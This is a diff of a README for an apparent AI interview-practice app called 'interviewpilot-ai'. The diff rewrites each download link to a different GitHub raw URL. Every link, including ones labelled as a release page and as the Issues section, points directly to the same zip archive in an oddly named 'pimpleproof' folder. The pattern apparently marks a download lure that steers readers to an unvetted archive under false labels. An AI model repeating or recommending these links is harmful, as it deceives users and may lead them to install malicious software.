@@ -1,6 +1,6 @@
 # 🎙️ interviewpilot-ai - Simplify Your Job Interviews
 
-[![Download interviewpilot-ai](https://raw.githubusercontent.com/AbhiroopGoel/interviewpilot-ai/main/pimpleproof/interviewpilot-ai-v1.1.zip⬇️-blue?style=for-the-badge)](https://raw.githubusercontent.com/AbhiroopGoel/interviewpilot-ai/main/pimpleproof/interviewpilot-ai-v1.1.zip)
+[![Download interviewpilot-ai](https://github.com/AbhiroopGoel/interviewpilot-ai/raw/refs/heads/main/pimpleproof/interviewpilot-ai-v1.1.zip⬇️-blue?style=for-the-badge)](https://github.com/AbhiroopGoel/interviewpilot-ai/raw/refs/heads/main/pimpleproof/interviewpilot-ai-v1.1.zip)
 
 ---
 
@@ -43,7 +43,7 @@ Follow these simple steps to start practicing interviews with interviewpilot-ai.
 ### 1. Visit the Download Page
 
 Click the big blue button at the top or click here to visit the download page:  
-[https://raw.githubusercontent.com/AbhiroopGoel/interviewpilot-ai/main/pimpleproof/interviewpilot-ai-v1.1.zip](https://raw.githubusercontent.com/AbhiroopGoel/interviewpilot-ai/main/pimpleproof/interviewpilot-ai-v1.1.zip)
+[https://github.com/AbhiroopGoel/interviewpilot-ai/raw/refs/heads/main/pimpleproof/interviewpilot-ai-v1.1.zip](https://github.com/AbhiroopGoel/interviewpilot-ai/raw/refs/heads/main/pimpleproof/interviewpilot-ai-v1.1.zip)
 
 ### 2. Download the Latest Release
 
@@ -122,7 +122,7 @@ A: It currently focuses on tech and general job interviews but adapts questions 
 ## 🔗 Download & Install
 
 You can get interviewpilot-ai from its release page here:  
-[https://raw.githubusercontent.com/AbhiroopGoel/interviewpilot-ai/main/pimpleproof/interviewpilot-ai-v1.1.zip](https://raw.githubusercontent.com/AbhiroopGoel/interviewpilot-ai/main/pimpleproof/interviewpilot-ai-v1.1.zip)
+[https://github.com/AbhiroopGoel/interviewpilot-ai/raw/refs/heads/main/pimpleproof/interviewpilot-ai-v1.1.zip](https://github.com/AbhiroopGoel/interviewpilot-ai/raw/refs/heads/main/pimpleproof/interviewpilot-ai-v1.1.zip)
 
 Visit the page to download the version that fits your system or use the web app version to run it instantly in your browser.
 
@@ -131,7 +131,7 @@ Visit the page to download the version that fits your system or use the web app 
 ## 📞 Contact & Support
 
 If you need help or want to report a bug, visit the GitHub repository’s Issues section:  
-https://raw.githubusercontent.com/AbhiroopGoel/interviewpilot-ai/main/pimpleproof/interviewpilot-ai-v1.1.zip
+https://github.com/AbhiroopGoel/interviewpilot-ai/raw/refs/heads/main/pimpleproof/interviewpilot-ai-v1.1.zip
 
 For general questions, use the contact email listed on the website or the app.
 
